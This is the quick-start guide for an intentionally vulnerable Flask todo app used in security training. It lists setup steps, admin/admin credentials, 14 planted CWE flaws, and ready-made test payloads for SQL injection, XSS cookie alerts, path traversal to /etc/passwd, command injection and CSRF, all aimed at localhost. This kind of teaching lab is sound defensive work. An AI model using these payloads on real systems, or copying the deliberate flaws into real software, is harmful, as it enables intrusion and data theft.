# QUICK START GUIDE

## ⚠️ WARNING: DELIBERATELY VULNERABLE APPLICATION

This application is **intentionally insecure** for educational purposes only!

---

## Installation & Setup

### Option 1: Local Development (Recommended for Learning)

```bash
# 1. Navigate to project directory
cd /home/irish/git/irishlab-io/yul-agentic/main

# 2. Create Python virtual environment (Python 3.11+ with vulnerable packages)
python3.11 -m venv .venv
source .venv/bin/activate  # On Windows: .venv\Scripts\activate

# 3. Install vulnerable dependencies
pip install -r requirements.txt

# 4. Run the application
python run.py

# 5. Access in browser
# http://localhost:8000
```

**Default Credentials:**

- Username: `admin`
- Password: `admin`

---

### Option 2: Docker (Demonstrates Container Vulnerabilities)

```bash
# Build and run with Docker Compose
docker-compose up --build

# Access at http://localhost:8000
```

**Note:** The Docker configuration is intentionally insecure to demonstrate container
security issues!

---

## Testing Vulnerabilities

### 1. SQL Injection (Easiest to Start)

**Login Page:**

```text
Username: admin' OR '1'='1
Password: anything
```

**Search Page:**

```text
Search: ' UNION SELECT username,password,null,null,null,null,null,null FROM users--
```

### 2. Cross-Site Scripting (XSS)

**Create Todo with XSS:**

```html
Title: <script>alert('XSS')</script>
Description: <img src=x onerror=alert(document.cookie)>
```

### 3. Path Traversal

**Access System Files:**

```text
http://localhost:8000/file/../../etc/passwd
http://localhost:8000/file/../../app/src/config/config.py
```

### 4. Insecure Direct Object References (IDOR)

**Access Other Users' Todos:**

```text
http://localhost:8000/todo/1
http://localhost:8000/todo/2
http://localhost:8000/todo/3
(Try different IDs)
```

### 5. Command Injection

**Admin Panel (after logging in as admin):**

```bash
Command: whoami
Command: ls -la
Command: cat /etc/passwd
Command: ls; cat /app/src/config/config.py
```

### 6. Authentication Bypass

**Bypass via URL Parameter:**

```text
http://localhost:8000/todos?bypass=true
```

### 7. CSRF Attack

Create an HTML file with this content and open it while logged into the app:

```html
<html>
<body>
<form action="http://localhost:8000/todo/1/delete" method="POST">
<input type="submit" value="Win a Prize!">
</form>
<script>document.forms[0].submit();</script>
</body>
</html>
```

---

## Application Structure

```text
vulnerable-todo-app/
├── src/
│   ├── __init__.py          # Main Flask application & routes
│   ├── config/              # Configuration directory
│   │   └── config.py        # Hardcoded credentials (CWE-798)
│   ├── models.py            # Database with SQL injection (CWE-89)
│   ├── auth.py              # Weak authentication (CWE-287)
│   ├── database.py          # Todo operations (IDOR, SQLi)
│   ├── utils.py             # Command injection, path traversal
│   ├── templates/           # XSS vulnerable templates
│   └── static/              # CSS & JavaScript
├── uploads/                  # File upload directory
├── data/                     # SQLite database
├── run.py                   # Application entry point
├── requirements.txt         # Vulnerable dependencies
├── Dockerfile               # Insecure container
├── compose.yml              # Vulnerable Docker Compose
├── README.md                # Full documentation
├── VULNERABILITIES.md       # Detailed vulnerability guide
└── EXPLOITS.md              # Exploitation examples
```

---

## Learning Path

### Beginner Level

1. **SQL Injection** - Login bypass and data extraction
2. **XSS** - Stored XSS in todos
3. **IDOR** - Access other users' data
4. **Path Traversal** - Read config files

### Intermediate Level

1. **CSRF** - Cross-site request forgery
2. **Command Injection** - Execute system commands
3. **Authentication Issues** - Multiple bypass methods
4. **File Upload** - Upload malicious files

### Advanced Level

1. **XXE** - XML External Entity attacks
2. **SSRF** - Server-side request forgery
3. **Insecure Deserialization** - Pickle RCE
4. **Container Escape** - Docker security issues

---

## Documentation

- **README.md** - Complete project overview
- **VULNERABILITIES.md** - Detailed vulnerability documentation with:
  - CWE references
  - Code examples
  - Exploitation techniques
  - Impact analysis
  - Mitigation strategies
- **EXPLOITS.md** - Practical exploitation examples

---

## Important Notes

### DO NOT

- Deploy this application to production
- Expose it to the internet
- Use any code from this project in real applications
- Test against systems you don't own

### DO

- Use only in isolated learning environments
- Understand each vulnerability before exploiting
- Learn the proper fixes for each issue
- Practice secure coding techniques

---

## Key Vulnerabilities Summary

| # | Vulnerability | CWE | Severity | Location |
|---|--------------|-----|----------|----------|
| 1 | SQL Injection | CWE-89 | Critical | auth.py, database.py |
| 2 | Cross-Site Scripting | CWE-79 | High | templates/*.html |
| 3 | CSRF | CWE-352 | High | All forms |
| 4 | IDOR | CWE-639 | High | database.py |
| 5 | Path Traversal | CWE-22 | High | **init**.py, utils.py |
| 6 | Command Injection | CWE-78 | Critical | utils.py |
| 7 | XXE | CWE-611 | High | utils.py |
| 8 | SSRF | CWE-918 | High | utils.py |
| 9 | Insecure Deserialization | CWE-502 | Critical | auth.py, utils.py |
| 10 | Hardcoded Credentials | CWE-798 | High | config.py |
| 11 | Weak Cryptography | CWE-327 | High | utils.py |
| 12 | Information Disclosure | CWE-200 | Medium | \_\_init\_\_.py |
| 13 | Missing Authentication | CWE-306 | High | \_\_init\_\_.py (API) |
| 14 | Unrestricted Upload | CWE-434 | Critical | utils.py |

**Plus:** Vulnerable dependencies and insecure Docker configuration!

---

## Troubleshooting

### Application won't start

```bash
# Check Python version
python3 --version

# Install dependencies again
pip install -r requirements.txt

# Check for port conflicts
lsof -i :8000
```

### Database errors

```bash
# Delete and recreate database
rm -rf data/vulnerable_app.db
python run.py
```

### Docker issues

```bash
# Clean up and rebuild
docker-compose down
docker-compose up --build
```

---

## Educational Resources

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [CWE List](https://cwe.mitre.org/)
- [Web Security Academy](https://portswigger.net/web-security)
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)

---

## Next Steps

1. ✅ Set up the application locally
2. ✅ Try the basic SQL injection examples
3. ✅ Read VULNERABILITIES.md for each vulnerability
4. ✅ Attempt to exploit each vulnerability
5. ✅ Understand why each is dangerous
6. ✅ Learn how to fix each vulnerability
7. ✅ Practice writing secure code

---

**Remember: The goal is to learn secure development practices by understanding how things can go wrong!** 🔒🎓

---

## Support

For questions or issues with this educational project, please refer to the documentation or create an issue in the repository.

**Happy Learning! But remember - with great knowledge comes great responsibility!** 🚀
